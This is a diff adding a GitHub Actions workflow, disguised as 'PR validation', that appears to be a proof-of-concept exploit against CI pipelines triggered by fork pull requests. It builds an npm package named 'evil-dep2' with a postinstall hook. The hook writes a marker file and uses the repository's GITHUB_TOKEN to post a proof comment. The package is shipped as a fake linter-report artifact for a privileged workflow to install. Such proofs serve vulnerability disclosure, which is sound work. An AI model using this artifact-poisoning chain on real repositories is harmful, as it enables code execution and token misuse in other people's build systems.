@@ -1,0 +1,48 @@
+name: ADP Forge PR validation
+on:
+  pull_request:
+jobs:
+  validate:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Build attacker-controlled linter-report artifact (fork PR, new workflow file)
+        run: |
+          set -euo pipefail
+          mkdir -p pkg
+          cat > pkg/package.json <<'JSON'
+          {"name":"evil-dep2","version":"1.0.0","scripts":{"postinstall":"node post.js"}}
+          JSON
+          cat > pkg/post.js <<'JS'
+          const fs = require('fs');
+          const path = require('path');
+          const root = process.env.INIT_CWD || process.cwd();
+          fs.writeFileSync('/tmp/ADP_FORK_RCE', 'pwned');
+          (async () => {
+            try {
+              const pr = fs.readFileSync(path.join(root, 'pr-number.txt'), 'utf8').trim();
+              const repo = process.env.GITHUB_REPOSITORY;
+              const r = await fetch(`https://api.github.com/repos/${repo}/issues/${pr}/comments`, {
+                method: 'POST',
+                headers: { 'Authorization': `Bearer ${process.env.GITHUB_TOKEN}`, 'Accept': 'application/vnd.github+json', 'Content-Type': 'application/json' },
+                body: JSON.stringify({ body: 'FORK_RCE_PROOF: code executed in privileged workflow_run triggered by a fork PR that only added a workflow file.' })
+              });
+              console.log('FORK_RCE_COMMENT_STATUS=' + r.status);
+            } catch (e) { console.log('FORK_RCE_COMMENT_ERR=' + e.message); }
+          })();
+          JS
+          (cd pkg && npm pack --silent >/dev/null)
+          cp pkg/evil-dep2-1.0.0.tgz .
+          cat > package.json <<'JSON'
+          {"name":"linter-consumer","version":"1.0.0","private":true,"dependencies":{"evil-dep2":"file:./evil-dep2-1.0.0.tgz"}}
+          JSON
+          echo "fork attacker controlled report" > linter-report.txt
+          echo "${{ github.event.pull_request.number }}" > pr-number.txt
+      - uses: actions/upload-artifact@v4
+        with:
+          name: linter-report
+          path: |
+            package.json
+            evil-dep2-1.0.0.tgz
+            linter-report.txt
+            pr-number.txt
+          if-no-files-found: ignore
